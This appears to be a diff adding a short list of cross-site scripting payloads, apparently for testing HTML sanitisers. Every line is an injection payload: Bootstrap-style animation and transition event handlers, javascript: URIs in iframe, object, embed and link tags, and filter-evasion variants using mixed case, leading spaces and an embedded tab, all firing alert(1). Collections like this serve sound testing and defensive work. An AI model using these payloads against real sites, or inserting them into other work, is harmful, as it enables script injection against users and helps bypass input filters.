@@ -1,0 +1,9 @@
+<xss class=progress-bar-animated onanimationstart=alert(1)>
+<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">XSS</a>
+<a href="JaVaScript:alert(1)">XSS</a>
+<a href="      javascript:alert(1)">XSS</a>
+<a href="javas	cript:alert(1)">XSS</a>
